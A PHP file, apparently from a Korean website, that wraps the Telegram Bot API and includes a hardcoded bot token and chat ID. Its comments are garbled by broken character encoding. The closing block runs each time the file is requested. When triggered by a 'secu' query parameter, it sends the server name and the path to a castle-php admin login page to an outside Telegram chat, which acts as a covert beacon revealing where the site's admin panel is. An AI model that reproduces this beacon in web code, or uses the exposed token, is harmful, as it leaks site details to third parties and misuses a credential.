<?php
/** �ڷ��׷� �˸�(push) **/
 
define('BOT_TOKEN', '677289767:AAHHwwMPPyiH-KL10EzVtzy9T4PXHyApOqU');
define('API_URL', 'https://api.telegram.org/bot'.BOT_TOKEN.'/');
 
$_TELEGRAM_CHAT_ID = "629869038";
 
function telegramExecCurlRequest($handle) {
 
    $response = curl_exec($handle);
 
    if ($response === false) {
        $errno = curl_errno($handle);
        $error = curl_error($handle);
        error_log("Curl returned error $errno: $error\n");
        curl_close($handle);
        return false;
    }
 
    $http_code = intval(curl_getinfo($handle, CURLINFO_HTTP_CODE));
    curl_close($handle);
 
    if ($http_code >= 500) {
        // do not wat to DDOS server if something goes wrong
        sleep(10);
        return false;
    } 
    else if ($http_code != 200) {
 
        $response = json_decode($response, true);
 
        error_log("Request has failed with error {$response['error_code']}: {$response['description']}\n");
 
        if ($http_code == 401) {
            throw new Exception('Invalid access token provided');
        }
 
        return false;
    } 
    else {
 
        $response = json_decode($response, true);
 
        if (isset($response['description'])) {
            error_log("Request was successfull: {$response['description']}\n");
        }
 
        $response = $response['result'];
    }
 
    return $response;
}
 
function telegramApiRequest($method, $parameters) {
 
    if (!is_string($method)) {
        error_log("Method name must be a string\n");
        return false;
    }
 
    if (!$parameters) {
        $parameters = array();
    } 
    else if (!is_array($parameters)) {
        error_log("Parameters must be an array\n");
        return false;
    }
 
    foreach ($parameters as $key => &$val) {
        // encoding to JSON array parameters, for example reply_markup
        if (!is_numeric($val) && !is_string($val)) {
            $val = json_encode($val);
        }
    }
 
    $url = API_URL.$method.'?'.http_build_query($parameters);
 
    $handle = curl_init($url);
    curl_setopt($handle, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($handle, CURLOPT_CONNECTTIMEOUT, 5);
    curl_setopt($handle, CURLOPT_TIMEOUT, 60);
 
    return telegramExecCurlRequest($handle);
}

/* 
// �޽��� �߼� �κ�
foreach($_TELEGRAM_CHAT_ID AS $_TELEGRAM_CHAT_ID_STR) {
 
    $_TELEGRAM_QUERY_STR    = array(
        'chat_id' => $_TELEGRAM_CHAT_ID_STR,
        //'text'    => "���ο� ���ǰ� ��ϵǾ����ϴ� - ����ó : {$_POST['wr_contact']}"
        'text'    => "���ο� ���ǰ� ��ϵǾ����ϴ�"
    );
 
    telegramApiRequest("sendMessage", $_TELEGRAM_QUERY_STR);
}
*/


if($_GET[secu]==1){
    $html = (strstr($_SERVER[SCRIPT_FILENAME],"/html"))? "/html":"";
    $msg = $_SERVER["SERVER_NAME"] . $html . "/castle-php/castle_admin_login.php";
    $page = $_GET['page'];    
}

//$msg = "secu - " . $_SERVER["SERVER_NAME"];
$_TELEGRAM_QUERY_STR    = array(
    'chat_id' => $_TELEGRAM_CHAT_ID,
    'text'    => $msg
);
telegramApiRequest("sendMessage", $_TELEGRAM_QUERY_STR);
?>
